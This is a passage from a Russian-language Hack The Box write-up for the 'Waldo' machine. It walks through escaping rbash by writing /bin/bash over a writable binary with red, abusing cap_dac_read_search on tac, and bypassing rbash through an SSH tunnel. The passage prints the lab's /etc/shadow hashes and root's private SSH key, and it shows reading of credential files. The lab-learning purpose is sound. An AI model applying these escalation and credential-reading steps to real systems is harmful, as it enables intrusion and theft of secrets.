-rw-rw---- 1 app-dev monitor    6824 May  3  2018 logMonitor.o
-rwxr----- 1 app-dev monitor     266 May  3  2018 makefile
-r-xr-x--- 1 app-dev monitor     795 May  3  2018 .restrictScript.sh
drwxr-x--- 2 app-dev monitor    4096 May  3  2018 v0.1
```

3\. `/home/monitor/app-dev/v0.1`
```text
monitor@waldo:~$ ls -la /home/monitor/app-dev/v0.1
total 24
drwxr-x--- 2 app-dev monitor  4096 May  3  2018 .
drwxrwx--- 3 app-dev monitor  4096 May  3  2018 ..
-r-xr-x--- 1 app-dev monitor 13706 May  3  2018 logMonitor-0.1
```

Из **[1]** мы видим, что у нас есть доступ к `ed`; из **[2]** видно, что в нашем распоряжении также есть исполняемый файл `logMonitor`. Если мы входим в группу "monitor", то у нас есть право записи в `logMonitor`, а значит, вырваться в привычный bash не составит труда, ведь *ed + исполняемый_файл_с_правом_записи_в_него =* :unlock:

Для проверки принадлежности пользователя "monitor" к группе "monitor" придется извращаться, команды `groups` же нет:
```text
monitor@waldo:~$ groups
-rbash: groups: command not found
```

Поэтому с помощью `rnano` посмотрим `/etc/passwd`:
```text
monitor@waldo:~$ rnano /etc/passwd
...
monitor:x:1001:1001:User for editing source and monitoring logs,,,:/home/monitor:/bin/rbash
...
```

А затем найдем группу с GID 1001 в `/etc/group`:
```text
monitor@waldo:~$ rnano /etc/group
...
monitor:x:1001:
...
```

Это и есть "monitor" — как мы и хотели.

Поэтому следующим нехитрым способом совершаем дерзский побег из ограниченного шелла:
```text
monitor@waldo:~$ red /bin/bash
1099016
w /home/monitor/app-dev/logMonitor
1099016
q
monitor@waldo:~$ logMonitor
tmp.YRYYiLMWl9: dircolors: command not found
monitor@waldo:~$ ls /
bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
```

```text
monitor@waldo:~$ export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
monitor@waldo:~$ whoami
monitor
monitor@waldo:~$ id
uid=1001(monitor) gid=1001(monitor) groups=1001(monitor)
monitor@waldo:~$ uname -a
Linux waldo 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1 (2018-04-29) x86_64 GNU/Linux
```

## PrivEsc: monitor → root
### Чтение файлов (Linux Capabilities)
Побродив еще немного по машине и повнимательнее изучив исполняемый файл `/home/monitor/app-dev/v0.1/logMonitor-0.1`, я обнаружил, что на нем висит мандат *CAP_DAC_READ_SEARCH* из арсенала одного из механизмов управления доступом в Линукс — [*Linux Capabilities*](http://man7.org/linux/man-pages/man7/capabilities.7.html "capabilities(7) - Linux manual page"):
```text
monitor@waldo:~$ getcap app-dev/v0.1/logMonitor-0.1
app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
```

Этот мандат позволяет игнорировать проверки наличия доступа на чтение для файлов и директорий.

`+ei` означает:
  - **e**ffective — используется ядром для проверки права доступа;
  - **i**nheritable — сохраняет право доступа при вызове *fork* и *execve*.

Интересный вводный материал про capabilities [здесь](https://www.incibe-cert.es/en/blog/linux-capabilities-en "Linux Capabilities and how to avoid being root / INCIBE-CERT").

А что если на машине есть еще исполняемые файлы, для которых установлены мандаты capabilities?

Проверить это можно все той же командой `getcap`:
```text
monitor@waldo:~$ getcap -r / 2>/dev/null
/usr/bin/tac = cap_dac_read_search+ei
/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
```

Бинго! С помощью `tac` (`cat` наоборот) можем прочитать любой файл, который вздумается:
## root.txt
```text
monitor@waldo:~$ tac /root/root.txt
8fb67c84????????????????????????
```

```text
monitor@waldo:~$ tac /etc/shadow | tac
root:$6$tRIbOmog$v7fPb8FKIT0QryKrm7RstojMs.ZXi4xxHz2Uix9lsw52eWtsURc9dwWMOyt4Gpd6QLtVtDnU1NO5KE5gF48r8.:17654:0:99999:7:::
daemon:*:17653:0:99999:7:::
bin:*:17653:0:99999:7:::
sys:*:17653:0:99999:7:::
sync:*:17653:0:99999:7:::
games:*:17653:0:99999:7:::
man:*:17653:0:99999:7:::
lp:*:17653:0:99999:7:::
mail:*:17653:0:99999:7:::
news:*:17653:0:99999:7:::
uucp:*:17653:0:99999:7:::
proxy:*:17653:0:99999:7:::
www-data:*:17653:0:99999:7:::
backup:*:17653:0:99999:7:::
list:*:17653:0:99999:7:::
irc:*:17653:0:99999:7:::
gnats:*:17653:0:99999:7:::
nobody:*:17653:0:99999:7:::
systemd-timesync:*:17653:0:99999:7:::
systemd-network:*:17653:0:99999:7:::
systemd-resolve:*:17653:0:99999:7:::
systemd-bus-proxy:*:17653:0:99999:7:::
_apt:*:17653:0:99999:7:::
avahi-autoipd:*:17653:0:99999:7:::
messagebus:*:17653:0:99999:7:::
sshd:*:17653:0:99999:7:::
steve:$6$MmXo3me9$zPPUertAwnJYQM8GUya1rzCTKGr/AHtjSG2n3faSeupCCBjoaknUz2YUDStZtvUGWuXonFqXKZF8pXCkezJ.Q.:17653:0:99999:7:::
monitor:$6$IXQ7fATd$RsOewky58ltAbfdjYBHFk9/q5bRcUplLnM9ZHKknVB46smsKn4msCOXDpyYU6xw43rGqJl5fG3sMmEaKhJAJt/:17654:0:99999:7:::
app-dev:$6$RQ4VUGfn$6WYq54MO9AvNFMW.FCRekOBPYJXuI02AqR5lYlwN5/eylTlTWmHlLLvJ4FDp4Nt0A/AX2b3zdrvyEfwf8vSh3/:17654:0:99999:7:::
```

Pwned :triumph:

# Разное
## Путаница с SSH
### nc ... 22
Если посмотреть на баннеры OpenSSH изнутри и снаружи docker-контейнера waldo с помощью netcat, то в силу их различия еще раз можно удостовериться, что существуют некие правила маршрутизации, перебрасывающие нас внутрь докера:
```text
root@kali:~# nc 10.10.10.87 22
SSH-2.0-OpenSSH_7.5
^C
```

```text
waldo:~$ nc localhost 22
SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u3
^Cpunt!
```

### sshd_config
Внутридокеровский конфиг SSH-сервера подтверждает, что слушается 8888-й порт, а не 22-й:
```text
waldo:~$ cat /etc/ssh/sshd_config |grep -v '^#' |grep .
Port 8888
PermitRootLogin no
AuthorizedKeysFile      .ssh/authorized_keys
PasswordAuthentication no
ChallengeResponseAuthentication no
Subsystem       sftp    /usr/lib/ssh/sftp-server

AllowUsers nobody
```

## Про Restricted-Shell и SSH-туннели
Покажу еще один способ обойти rbash и оказаться в привычном шелле.

Для этого настроим SSH-туннель, чтобы не мучаться с "двойным SSH":
```text
root@kali:~# ssh -oStrictHostKeyChecking=no -L 8022:127.0.0.1:22 -i nobody.key nobody@10.10.10.87
...
```

Теперь при подключении к `localhost:8022` под юзером "monitor" мы сразу попадем внутрь хоста, а не докера:
```text
waldo:~$ nc localhost 8022
SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u3
^Cpunt!
```

Воспользуемся флагом `-t` для спауна PTY'я и запустим bash при инициализации SSH-подключения:
```text
root@kali:~# ssh -oStrictHostKeyChecking=no -t -i nobody.key -p 8022 monitor@localhost 'bash'
monitor@waldo:~$ export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
monitor@waldo:~$ ls /
bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
```

И мы больше не в rbash'е!

### Почему это работает
`/etc/profile` загружает `/etc/bash.bashrc`, в котором есть интересное условие:
```text
monitor@waldo:~$ cat /etc/bash.bashrc |grep -n -A1 'interactively'
6:# If not running interactively, don't do anything
7-[ -z "$PS1" ] && return
```

Если переменная `PS1` пуста, то ничего не делаем и просто выходим из скрипта. `PS1` — это ничто иное, как ***P**rompt **S**tring*.

Вот как она выглядит:
```text
monitor@waldo:~$ echo $PS1
${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$
```

А вот, что мы видим при выполнении этой же команды при SSH-коннекте:
```text
root@kali:~# ssh -oStrictHostKeyChecking=no -t -i nobody.key -p 8022 monitor@localhost 'echo $PS1'

Shared connection to localhost closed.
```

Переменная пуста, что дает нам возможность обойти выполнение `/etc/bash.bashrc`, в котором, в свою очередь, устанавливается "плохое" значение переменной `PATH` (`/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1`).

Поэтому, так как `PATH` дефолтен при выполнении команд через SSH:
```text
root@kali:~# ssh -oStrictHostKeyChecking=no -t -i nobody.key -p 8022 monitor@localhost 'echo $PATH'
/usr/local/bin:/usr/bin:/bin:/usr/games
Shared connection to localhost closed.
```

То мы имеем возможность выполнить bash *изнутри* rbash, а далее загрузится `/etc/bash.bashrc`, и мы, уже будучи не в rbash'е, спокойно поменяем значение PATH через `export PATH=...`.

## LinEnum.sh
После того, как я уже прошел Waldo [LinEnum.sh](https://github.com/rebootuser/LinEnum "rebootuser/LinEnum: Scripted Local Linux Enumeration & Privilege Escalation Checks") обновился и теперь может искать интересные файлы с выставленными capabilities:
```text
monitor@waldo:/tmp$ bash LinEnum.sh -t
...
[+] Files with POSIX capabilities set:
/usr/bin/tac = cap_dac_read_search+ei
/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei


[+] Users with specific POSIX capabilities:
cap_dac_read_search monitor


[+] Capabilities associated with the current user:
cap_dac_read_search


[+] Files with the same capabilities associated with the current user (You may want to try abusing those capabilties):
/usr/bin/tac = cap_dac_read_search+ei
/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei


[+] Permissions of files with the same capabilities associated with the current user:
-rwxr-xr-x 1 root root 39752 Feb 22  2017 /usr/bin/tac
-r-xr-x--- 1 app-dev monitor 13706 May  3  2018 /home/monitor/app-dev/v0.1/logMonitor-0.1
...
```

## Root-шелл
Можно было бы прочитать SSH-ключ суперпользователя для получения полноценной root-сессии:
```text
monitor@waldo:~$ tac /root/.ssh/id_rsa | tac
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAvN1rN9lPfdclMO+ZnoA17rDK5coWWPBMfIadj/PKozv1Ol49
Hql4uEZ6XmLqaV5sfbGaYShuRDJqverunF/c6ntu7AADFozRfkmXxnjkU4P7g8nE
IvNf4ow46MvAdiK3nEBD6TJJpwBjqI/RiVb7xac9uA9XWPAZk5CKw1VDCYzhWdbW
GymtVldQkpmMgE8h1/ymWTIXeMuPp/4k/Gfa0jB0TKplZFpGHZ0mBqsEFAU55t7E
TH9Vx2Otr6alb5C5Ufr3vrmdg5wat9FJYMKnd2hz1ful9GNpOF8cWUIDZYzAHmCO
ZXGiiZmiigagRDWCiiT/Jv0l+nek8ytEvGWiIQIDAQABAoIBAFQbAoFHe/fdVImb
WbzU+a+G+YQlX5hRwq39wLL3bTkOHWHVz8AU1laxxBK+WAd+bi/3ZHl56Mjj7tcO
hR4MLrQZLcdZJgbnxO9JVJalBYEPmHUS6A5sdTnNGhbJjbbONRgXImb55wTAzqCl
EznnC430sS6DXnGT0r/9MV5VXNomJwyPBz0t8yqvS8uJkni0GZE3hGRrd5fFeEgz
fz38bJCkN1RWWVgOiKYJUCZQRJ3eNiPBRChp0+NSY3Z/E4omNc07/xpdOnUyPMSP
sdQ5XKj5AIIW2XEd+S0Ro1IebfU3S0Bl4pCRzrROxJLNQNOedOv57JoEtcVC0Ko4
DRTS2YUCgYEA8YGaIIs9L6b2JmnXe8BKBZb0O61r3EsWvkGAsyzxbIlWNSWOcdW5
eHyHW9Md2J4hDTQbrFDQ7yUDoK+j6fi6V/fndD4IE9NUc1pNhhCB1Nt9nwj28nS7
DgNeNaceHtVrn5Hc9KTUJE7HhBwSffKMM95D/7xzYYxTqM11yh7c/ncCgYEAyDMO
05yq1Q/+t2tC5y3M+DVo4/cz65dppQcOf0MIIanwV7ncgk2Wa5Mw8fdo1FtnCdlR
kDE9rs5RkhoMhWcV9R1lV1xXScHaJik0ljghKrnU3yRNPOXTcKCCnxGhXsx8GjWu
uOV/JA5w4urzbUPRNqagREzeqTZN04aM2Jz9kicCgYBZPoVQJWQU6ePoShCBAIva
CPBz5SAIpg7fe6EtlRwZ+Z5LwXckBdCl/46dliRfWf/ouyrGwI6U8N6oUH+IBIwH
2epEAHBHsz5v6hzfv9XabMm9LTjkW9KL2R7FQN5WkpNUwjgeh5KFYD9GSIFk3W6F
9Eq4hFE26P45UMOIT2Nm/QKBgQCPrWUEpblMs/AAPvCC7THfKKWghbczazUchNX4
q2jYkBe3PeJtebVsevRzkzYewYJPZTHOJCi6ncOY8SzvSK5PfctPSSwz+PXQ0V22
OY5EFZ4ajvkHrYFzoR5dfs+rM2IVhVVhyQLYI60MjcYqMrOhXzBCFFDwa9Kq7jOC
+hhZnQKBgQClMZWr2GmGv7KN/LfhOa0dil3fWtxSdHdwdLlgrKDJslcQUM03sACh
F8mp0GWsEg8kUboEKkyAffG5mcZ/xwZP0MbnmGjIg28DgcbnMsldxOJi3m3VAbC+
x8YIcMgR7/X4fGSV20lsgTVMSH9uNNXD+W3sCJ6Nk+mUBcdUoeFt+w==
-----END RSA PRIVATE KEY-----
```

Однако в данном инстансе нет списка с разрешенными SSH-ключами (aka *authorized_keys*) для рута:
```text
monitor@waldo:~$ tac /root/.ssh/authorized_keys
tac: failed to open '/root/.ssh/authorized_keys' for reading: No such file or directory
```

Что делает авторизацию невозможной.

Мы нашли спрятавшийся root, спасибо за внимание :innocent:

{: .center-image}
![waldo-owned.png]({{ "/img/htb/boxes/waldo/waldo-owned.png" | relative_url }})

{: .center-image}
![waldo-trophy.png]({{ "/img/htb/boxes/waldo/waldo-trophy.png" | relative_url }})
